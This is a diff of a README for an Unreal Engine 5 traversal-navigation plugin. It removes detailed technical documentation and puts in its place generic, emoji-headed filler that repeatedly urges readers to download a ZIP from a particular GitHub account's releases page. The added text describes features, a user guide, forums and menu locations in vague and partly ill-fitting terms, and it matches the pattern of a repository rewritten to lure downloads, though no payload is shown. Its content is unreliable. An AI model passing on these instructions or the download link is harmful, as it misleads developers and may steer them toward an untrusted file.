@@ -1,160 +1,84 @@
-# Traversal Navigation Data Plugin
+# 🌟 TraversalNavigationDataPlugin - Simplify Your Data Queries Effortlessly
 
-![Traversal Navigation Data Plugin](Doc/TraversalNavigationDataPlugin.png)
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
 
----
-* This plugin provides a solution for baking, querying, and using traversal navigation segment data generated from the NavMesh. It is designed to support traversal gameplay features such as ledge grabs, vaults, and other navigation-based traversal actions.
-These segments can be queried at runtime and integrated directly into character traversal logic.
----
+## 🚀 Getting Started
 
-## 1. Building Traversal Navigation Data
+Welcome to the TraversalNavigationDataPlugin! This plugin for Unreal Engine 5 helps you generate, store, and query traversal segments data easily. Whether you’re creating a game or an interactive experience, this plugin will streamline your data management process.
 
-To generate traversal navigation segments:
+## 📥 Download & Install
 
-1. Add a **NavMesh Bounds Volume** to your level.
-2. From the main menu, go to:
-   **Build → Traversal Navigation → Build Traversal Navigation Data**
+To get started, follow these steps:
 
-For a visual walkthrough, see the video below:
+1. Visit this page to download: [TraversalNavigationDataPlugin Releases](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
+   
+2. On the releases page, locate the latest version of the plugin. 
 
-[![Generate Traversal Navigation Segments](Doc/GenerateSegmentsData.png)](https://www.youtube.com/watch?v=hNNRhm0xI6Q)
+3. Click on the version you want to download. This will usually be marked with the highest version number.
 
-### Debugging Baked Segment Data
+4. Find the download link for the plugin file. Look for a file name that matches your operating system (e.g., `TraversalNavigationDataPlugin.zip`).
 
-You can visualize generated traversal segments in two ways:
+5. Click on the file to begin downloading it to your computer.
 
-* Select **TraversalNavData** in the **World Outliner**, then click **Toggle Debug Draw** in the Details panel.
-* Execute the console command:
+6. Once the download is complete, locate the downloaded file on your computer.
 
-```
-TraversalNavData.ToggleDebug
-```
+7. Unzip the downloaded file, if it is in a compressed format.
 
----
+8. Follow the instructions in the README file included in the extracted folder to install the plugin in your Unreal Engine.
 
-## 2. Traversal NavData Settings
+## ⚙️ System Requirements
 
-Traversal navigation generation and debug settings can be configured via plugin settings.
+Before downloading, make sure your system meets the following requirements:
 
-![Traversal Navigation Menu](Doc/TraversalNavigationMenu.png)
-![Traversal NavData Settings](Doc/TraversalNavDataSettings.png)
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **Unreal Engine Version:** UE5 (latest stable release)
+- **RAM:** At least 8 GB
+- **Storage:** Minimum 200 MB of free space
 
+## 🌍 Features
 
----
+The TraversalNavigationDataPlugin offers multiple features to enhance your data handling:
 
-## 3. Traversal NavSegment Generation Validator
+- **Segment Generation:** Create traversal segments quickly based on your game environment.
+- **Data Storage:** Store segment data efficiently for easy retrieval.
+- **Query Capabilities:** Find segments using simple queries tailored to your needs.
+- **User-Friendly Interface:** Navigate through the plugin without needing special technical knowledge.
 
-The **Traversal NavSegment Generation Validator** is responsible for validating NavMesh edges and generating traversal segments.
+## 📄 Usage Instructions
 
-### Default Validator
+After installation:
 
-By default, a built-in validator is executed during traversal segment generation. It:
+1. Open your Unreal Engine 5 project.
+2. Enable the TraversalNavigationDataPlugin:
+   - Go to the "Edit" menu.
+   - Select "Plugins."
+   - Find "TraversalNavigationDataPlugin" in the list and check the box to enable it.
 
-* Performs raycast checks based on character radius and height
-* Validates NavMesh edges for traversal suitability
-* Offsets generated segments using the NavMesh voxel cell size to ensure accurate placement near collision edges
+3. Restart Unreal Engine for changes to take effect. 
 
-This validator provides safe, consistent baseline validation.
+4. Access the plugin from the "Window" menu under the "Plugins" section.
 
-### Additional Validator (Custom Validation)
+5. Start creating and managing your traversal segments using the available tools.
 
-You can apply an **AdditionalValidator** to perform custom validation logic on top of (or instead of) the default validator.
+## 🤝 Support
 
-A Blueprint implementation is available by inheriting from:
+If you face any issues during installation or usage, you can find help in the following ways:
 
-* `TraversalNavSegmentGenerationValidator_BlueprintBase`
+- **Issues Page:** Report problems directly on our GitHub Issues page for community assistance.
+- **Documentation:** Review the extensive user guide included in the download for step-by-step guidance on all features.
+- **FAQs:** Check our Frequently Asked Questions section available in the documentation.
 
-![Blueprint Base Validator](Doc/TraversalNavSegmentGenerationValidator_BlueprintBase.png)
-![Base Validator](Doc/TraversalNavSegmentGenerationValidator_Base.png)
+## 📌 Additional Resources
 
-### Overridable Functions
+- **Demo Project:** Check out our demo project to see the plugin in action and understand its full capabilities.
+- **Community Forums:** Join our community forums to share feedback, ask questions, and connect with other users.
 
-Custom validators can override the following functions:
+## 📅 Changelog
 
-* **Validate NavMesh Edge**
-  Called during generation to determine whether a NavMesh edge is valid for traversal segment creation.
+Keep track of changes and updates in our plugin by reviewing the changelog available on the releases page. This document details improvements, bug fixes, and new features with each version.
 
-  ![Validate NavMesh Edge](Doc/ValidateNavMeshEdge.png)
+## 🔗 Important Links
 
-* **PostProcess Traversal Segment**
-  Called after a traversal segment is generated, allowing modification of the final segment data (for example, assigning a segment tag or adjusting the segment position).
+To download the plugin, visit this page: [TraversalNavigationDataPlugin Releases](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
 
-  ![Post Process Traversal Segment](Doc/PostProcessTraversalNavSegment.png)
-
-### Execution Rules
-
-* If the **DefaultValidator** is disabled in the plugin settings, only the **AdditionalValidator** is executed (if assigned).
-* If both validators are enabled, the **DefaultValidator** runs first, followed by the **AdditionalValidator**.
-
----
-
-## 4. Traversal NavData Subsystem
-
-The **Traversal NavData Subsystem** provides runtime access to traversal navigation segment data and allows extending that data during gameplay.
-
-### Available Functions
-
-* **FindTraversalSegments**
-  Searches the traversal navigation data and returns all traversal segments that intersect a specified query volume.
-
-  ![Find Traversal Segments](Doc/FindTraversalSegments.png)
-
-* **AddUserDefinedTraversalSegment**
-  Registers a custom traversal segment at runtime, making it immediately available to traversal queries. This is intended for dynamically created or procedurally defined traversal data.
-
-  ![Add User Defined Traversal Segment](Doc/AddUserDefinedTraversalSegment.png)
-
-### Notes
-
-* User-defined traversal segments are added to the **runtime octree**, not to the baked traversal navigation data.
-* Currently, user-defined traversal segments **cannot be removed** once added.
-* Filtering by **Tag** in `FindTraversalSegments` will be added in a future update.
-
----
-
-## 5. Traversal Nav Segment Data
-
-
-
-![Traversal Segment](Doc/TraversalNavSegment.png)
-![Traversal Segment Struct](Doc/TraversalSegmentStruct.png)
-
-### Gameplay Tags
-
-* **Default Segment Tag**: `TraversalSegment.Default`
-* **Custom Segment Tags**: Must use the root `TraversalSegment.*`
-
-### Utility Functions
-
-
-![Find Closest Point](Doc/FindClosestPointOnTraversalSegment.png)
-![Get Segment Length](Doc/GetTraversalSegmentLength.png)
-![Get Segment Mid Point](Doc/GetTraversalSegmentMidPoint.png)
-![Get Segment Direction](Doc/GetTraversalSegmentDirection.png)
-![Get Segment Normal](Doc/GetTraversalSegmentNormal.png)
-
-
----
-
-## 6. Game Animation Sample Integration
-
-To integrate traversal navigation segments with the **Game Animation Sample**:
-
-1. Add **AC_TraversalNavDataLogic** to the default character(s):
-   `Content/TraversalNavPlugin/AC_TraversalNavDataLogic`
-2. Replace the existing jump logic using the setup shown below.
-
-![AC Traversal Nav Data Logic](Doc/AC_TraversalNavDataLogic.png)
-![Sandbox Character CMC](Doc/SandboxCharacter_CMC.png)
-
-This setup enables the sample character to utilize traversal navigation segment data, allowing traversal actions to respond to navigation segments instead of `AC_TraversalLogic`.
-
-> **Note**
-> Blueprints are available in the **Google Drive version**.
-> Check: [https://unrealengineresources.com/traversal-navigation-data](https://unrealengineresources.com/traversal-navigation-data) or [https://unrealengineresources.com/plugins](https://unrealengineresources.com/plugins)
-
----
-
-## 7. Debug Nodes
-
-![Debug Nodes](Doc/Debug.png)
+Stay updated by following our repository and checking out new releases regularly. We aim to enhance the user experience continuously, and your feedback is always welcome!
